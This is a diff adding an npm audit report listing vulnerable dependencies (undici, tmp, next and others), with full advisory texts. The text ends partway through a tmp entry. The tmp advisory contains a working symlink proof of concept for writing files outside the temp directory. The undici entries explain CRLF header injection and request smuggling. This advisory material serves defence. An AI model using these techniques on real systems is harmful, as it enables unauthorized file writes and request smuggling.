@@ -1,0 +1,1496 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241209,
+          "path": "apps__api>@vitest/coverage-v8>magicast>source-map-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "source-map-js",
+      "target": "1.2.2",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241331,
+          "path": "apps__web>next>sharp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "undici",
+      "resolves": [
+        {
+          "id": 1101609,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112496,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113068,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114592,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114594,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114638,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114640,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114642,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1121242,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1121245,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1121255,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130716,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130727,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130732,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1137243,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240039,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240042,
+          "path": "apps__api>@nestjs/mau>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tmp",
+      "resolves": [
+        {
+          "id": 1109537,
+          "path": "apps__api>@nestjs/mau>inquirer>external-editor>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120654,
+          "path": "apps__api>@nestjs/mau>inquirer>external-editor>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "deepmerge-ts",
+      "resolves": [
+        {
+          "id": 1145093,
+          "path": "apps__api>prisma>@prisma/config>deepmerge-ts",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "mysql2",
+      "resolves": [
+        {
+          "id": 1153173,
+          "path": "apps__api>prisma>mysql2",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158532,
+          "path": "apps__api>prisma>mysql2",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "braces",
+      "resolves": [
+        {
+          "id": 1240992,
+          "path": "apps__web>eslint-config-next>@next/eslint-plugin-next>fast-glob>micromatch>braces",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1241489,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241490,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241492,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241493,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241495,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241496,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1101609": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-c76h-2ccp-4975\n- https://nvd.nist.gov/vuln/detail/CVE-2025-22150\n- https://github.com/nodejs/undici/commit/711e20772764c29f6622ddc937c63b6eefdf07d0\n- https://github.com/nodejs/undici/commit/c2d78cd19fe4f4c621424491e26ce299e65e934a\n- https://github.com/nodejs/undici/commit/c3acc6050b781b827d80c86cbbab34f14458d385\n- https://hackerone.com/reports/2913312\n- https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f\n- https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113\n- https://github.com/advisories/GHSA-c76h-2ccp-4975",
+      "created": "2025-01-21T21:10:47.000Z",
+      "id": 1101609,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n[Undici `fetch()` uses Math.random()](https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113) to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.\n\nIf there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.\n\n### Patches\n\nThis is fixed in 5.28.5; 6.21.1; 7.2.3.\n\n### Workarounds\n\nDo not issue multipart requests to attacker controlled servers.\n\n### References\n\n* https://hackerone.com/reports/2913312\n* https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f\n",
+      "reported_by": null,
+      "title": "Use of Insufficiently Random Values in undici",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-22150"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.0.0 <6.21.1",
+      "github_advisory_id": "GHSA-c76h-2ccp-4975",
+      "recommendation": "Upgrade to version 6.21.1 or later",
+      "patched_versions": ">=6.21.1",
+      "updated": "2025-01-22T08:01:28.000Z",
+      "cvss": {
+        "score": 6.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-330"
+      ],
+      "url": "https://github.com/advisories/GHSA-c76h-2ccp-4975"
+    },
+    "1109537": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": [
+            "apps__api>@nestjs/mau>inquirer>external-editor>tmp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+      "created": "2025-08-06T17:06:04.000Z",
+      "id": 1109537,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "reported_by": null,
+      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-54798"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tmp",
+      "vulnerable_versions": "<=0.2.3",
+      "github_advisory_id": "GHSA-52f5-9888-hmc6",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2025-11-03T21:34:21.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+    },
+    "1112496": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9\n- https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22036\n- https://github.com/advisories/GHSA-g9mf-h72j-4rw9",
+      "created": "2026-01-14T21:06:08.000Z",
+      "id": 1112496,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.\n\nHowever, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.\n\n### Patches\n\nUpgrade to 7.18.2 or 6.23.0.\n\n### Workarounds\n\nIt is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually.\n\n### References\n\n* https://hackerone.com/reports/3456148\n* https://github.com/advisories/GHSA-gm62-xv2j-4w53\n* https://curl.se/docs/CVE-2022-32206.html",
+      "reported_by": null,
+      "title": "Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22036"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.23.0",
+      "github_advisory_id": "GHSA-g9mf-h72j-4rw9",
+      "recommendation": "Upgrade to version 6.23.0 or later",
+      "patched_versions": ">=6.23.0",
+      "updated": "2026-01-22T20:17:08.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-g9mf-h72j-4rw9"
+    },
+    "1113068": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-cxrh-j4jr-qwg3\n- https://github.com/nodejs/undici/issues/3895\n- https://github.com/nodejs/undici/pull/4088\n- https://nvd.nist.gov/vuln/detail/CVE-2025-47279\n- https://github.com/nodejs/undici/commit/f317618ec28753a4218beccea048bcf89c36db25\n- https://github.com/advisories/GHSA-cxrh-j4jr-qwg3",
+      "created": "2025-05-15T14:15:06.000Z",
+      "id": 1113068,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApplications that use undici to implement a webhook-like system are vulnerable. If the attacker set up a server with an invalid certificate, and they can force the application to call the webhook repeatedly, then they can cause a memory leak. \n\n### Patches\n\nThis has been patched in https://github.com/nodejs/undici/pull/4088.\n\n### Workarounds\n\nIf a webhook fails, avoid keep calling it repeatedly.\n\n### References\n\nReported as: https://github.com/nodejs/undici/issues/3895",
+      "reported_by": null,
+      "title": "undici Denial of Service attack via bad certificate data",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-47279"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.0.0 <6.21.2",
+      "github_advisory_id": "GHSA-cxrh-j4jr-qwg3",
+      "recommendation": "Upgrade to version 6.21.2 or later",
+      "patched_versions": ">=6.21.2",
+      "updated": "2026-02-06T21:35:54.000Z",
+      "cvss": {
+        "score": 3.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-401"
+      ],
+      "url": "https://github.com/advisories/GHSA-cxrh-j4jr-qwg3"
+    },
+    "1114592": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-f269-vfmq-vjvj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-1528\n- https://hackerone.com/reports/3537648\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-f269-vfmq-vjvj",
+      "created": "2026-03-13T20:07:26.000Z",
+      "id": 1114592,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA server can reply with a WebSocket frame using the 64-bit length form and an extremely large length. undici's ByteParser overflows internal math, ends up in an invalid state, and throws a fatal TypeError that terminates the process. \n\n### Patches\n\n\n Patched in the undici version v7.24.0 and v6.24.0. Users should upgrade to this version or later.\n\n### Workarounds\n\nThere are no workarounds.",
+      "reported_by": null,
+      "title": "Undici: Malicious WebSocket 64-bit length overflows parser and crashes the client",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-1528"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.0.0 <6.24.0",
+      "github_advisory_id": "GHSA-f269-vfmq-vjvj",
+      "recommendation": "Upgrade to version 6.24.0 or later",
+      "patched_versions": ">=6.24.0",
+      "updated": "2026-03-13T20:07:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-f269-vfmq-vjvj"
+    },
+    "1114594": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-2mjp-6q6p-2qxm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-1525\n- https://hackerone.com/reports/3556037\n- https://cna.openjsf.org/security-advisories.html\n- https://cwe.mitre.org/data/definitions/444.html\n- https://www.rfc-editor.org/rfc/rfc9110.html#section-8.6\n- https://github.com/advisories/GHSA-2mjp-6q6p-2qxm",
+      "created": "2026-03-13T20:07:03.000Z",
+      "id": 1114594,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUndici allows duplicate HTTP `Content-Length` headers when they are provided in an array with case-variant names (e.g., `Content-Length` and `content-length`). This produces malformed HTTP/1.1 requests with multiple conflicting `Content-Length` values on the wire.\n\n**Who is impacted:**\n  - Applications using `undici.request()`, `undici.Client`, or similar low-level APIs with headers passed as flat arrays\n  - Applications that accept user-controlled header names without case-normalization\n\n**Potential consequences:**\n  - **Denial of Service**: Strict HTTP parsers (proxies, servers) will reject requests with duplicate `Content-Length` headers (400 Bad Request)\n  - **HTTP Request Smuggling**: In deployments where an intermediary and backend interpret duplicate headers inconsistently (e.g., one uses the first value, the other uses the last), this can enable request smuggling attacks leading to ACL bypass, cache poisoning, or credential hijacking\n\n### Patches\n\n Patched in the undici version v7.24.0 and v6.24.0. Users should upgrade to this version or later.\n\n### Workarounds\n\n  If upgrading is not immediately possible:\n\n  1. **Validate header names**: Ensure no duplicate `Content-Length` headers (case-insensitive) are present before passing headers to undici\n  2. **Use object format**: Pass headers as a plain object (`{ 'content-length': '123' }`) rather than an array, which naturally deduplicates by key\n  3. **Sanitize user input**: If headers originate from user input, normalize header names to lowercase and reject duplicates",
+      "reported_by": null,
+      "title": "Undici has an HTTP Request/Response Smuggling issue",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-1525"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.24.0",
+      "github_advisory_id": "GHSA-2mjp-6q6p-2qxm",
+      "recommendation": "Upgrade to version 6.24.0 or later",
+      "patched_versions": ">=6.24.0",
+      "updated": "2026-03-13T20:07:05.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-2mjp-6q6p-2qxm"
+    },
+    "1114638": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-vrm6-8vpv-qv8q\n- https://nvd.nist.gov/vuln/detail/CVE-2026-1526\n- https://hackerone.com/reports/3481206\n- https://cna.openjsf.org/security-advisories.html\n- https://datatracker.ietf.org/doc/html/rfc7692\n- https://owasp.org/www-community/attacks/Denial_of_Service\n- https://github.com/advisories/GHSA-vrm6-8vpv-qv8q",
+      "created": "2026-03-13T20:41:56.000Z",
+      "id": 1114638,
+      "npm_advisory_id": null,
+      "overview": "## Description\n\nThe undici WebSocket client is vulnerable to a denial-of-service attack via unbounded memory consumption during permessage-deflate decompression. When a WebSocket connection negotiates the permessage-deflate extension, the client decompresses incoming compressed frames without enforcing any limit on the decompressed data size. A malicious WebSocket server can send a small compressed frame (a \"decompression bomb\") that expands to an extremely large size in memory, causing the Node.js process to exhaust available memory and crash or become unresponsive.\n\nThe vulnerability exists in the `PerMessageDeflate.decompress()` method, which accumulates all decompressed chunks in memory and concatenates them into a single Buffer without checking whether the total size exceeds a safe threshold.\n\n## Impact\n\n- Remote denial of service against any Node.js application using undici's WebSocket client\n- A single compressed WebSocket frame of ~6 MB can decompress to ~1 GB or more\n- Memory exhaustion occurs in native/external memory, bypassing V8 heap limits\n- No application-level mitigation is possible as decompression occurs before message delivery\n\n### Patches\n\nUsers should upgrade to fixed versions.\n\n### Workarounds\n\nNo workaround are possible.",
+      "reported_by": null,
+      "title": "Undici has Unbounded Memory Consumption in WebSocket permessage-deflate Decompression",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-1526"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.24.0",
+      "github_advisory_id": "GHSA-vrm6-8vpv-qv8q",
+      "recommendation": "Upgrade to version 6.24.0 or later",
+      "patched_versions": ">=6.24.0",
+      "updated": "2026-03-13T20:41:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-vrm6-8vpv-qv8q"
+    },
+    "1114640": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-v9p9-hfj2-hcw8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2229\n- https://hackerone.com/reports/3487486\n- https://cna.openjsf.org/security-advisories.html\n- https://datatracker.ietf.org/doc/html/rfc7692\n- https://nodejs.org/api/zlib.html#class-zlibinflateraw\n- https://github.com/advisories/GHSA-v9p9-hfj2-hcw8",
+      "created": "2026-03-13T20:41:41.000Z",
+      "id": 1114640,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe undici WebSocket client is vulnerable to a denial-of-service attack due to improper validation of the `server_max_window_bits` parameter in the permessage-deflate extension. When a WebSocket client connects to a server, it automatically advertises support for permessage-deflate compression. A malicious server can respond with an out-of-range `server_max_window_bits` value (outside zlib's valid range of 8-15). When the server subsequently sends a compressed frame, the client attempts to create a zlib InflateRaw instance with the invalid windowBits value, causing a synchronous RangeError exception that is not caught, resulting in immediate process termination.\n\nThe vulnerability exists because:\n\n1. The `isValidClientWindowBits()` function only validates that the value contains ASCII digits, not that it falls within the valid range 8-15\n2. The `createInflateRaw()` call is not wrapped in a try-catch block\n3. The resulting exception propagates up through the call stack and crashes the Node.js process\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_",
+      "reported_by": null,
+      "title": "Undici has Unhandled Exception in WebSocket Client Due to Invalid server_max_window_bits Validation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2229"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.24.0",
+      "github_advisory_id": "GHSA-v9p9-hfj2-hcw8",
+      "recommendation": "Upgrade to version 6.24.0 or later",
+      "patched_versions": ">=6.24.0",
+      "updated": "2026-03-13T20:41:44.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-v9p9-hfj2-hcw8"
+    },
+    "1114642": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-4992-7rv2-5pvq\n- https://nvd.nist.gov/vuln/detail/CVE-2026-1527\n- https://hackerone.com/reports/3487198\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-4992-7rv2-5pvq",
+      "created": "2026-03-13T20:41:26.000Z",
+      "id": 1114642,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen an application passes user-controlled input to the `upgrade` option of `client.request()`, an attacker can inject CRLF sequences (`\\r\\n`) to:\n\n1. Inject arbitrary HTTP headers\n2. Terminate the HTTP request prematurely and smuggle raw data to non-HTTP services (Redis, Memcached, Elasticsearch)\n\nThe vulnerability exists because undici writes the `upgrade` value directly to the socket without validating for invalid header characters:\n\n```javascript\n// lib/dispatcher/client-h1.js:1121\nif (upgrade) {\n  header += `connection: upgrade\\r\\nupgrade: ${upgrade}\\r\\n`\n}\n```\n\n### Patches\n\n Patched in the undici version v7.24.0 and v6.24.0. Users should upgrade to this version or later.\n\n### Workarounds\n\nSanitize the `upgrade` option string before passing to undici:\n\n```javascript\nfunction sanitizeUpgrade(value) {\n  if (/[\\r\\n]/.test(value)) {\n    throw new Error('Invalid upgrade value')\n  }\n  return value\n}\n\nclient.request({\n  upgrade: sanitizeUpgrade(userInput)\n})\n```",
+      "reported_by": null,
+      "title": "Undici has CRLF Injection in undici via `upgrade` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-1527"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.24.0",
+      "github_advisory_id": "GHSA-4992-7rv2-5pvq",
+      "recommendation": "Upgrade to version 6.24.0 or later",
+      "patched_versions": ">=6.24.0",
+      "updated": "2026-03-13T20:41:28.000Z",
+      "cvss": {
+        "score": 4.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-93"
+      ],
+      "url": "https://github.com/advisories/GHSA-4992-7rv2-5pvq"
+    },
+    "1120654": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": [
+            "apps__api>@nestjs/mau>inquirer>external-editor>tmp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65\n- https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44705\n- https://github.com/advisories/GHSA-ph9p-34f9-6g65",
+      "created": "2026-05-27T00:34:06.000Z",
+      "id": 1120654,
+      "npm_advisory_id": null,
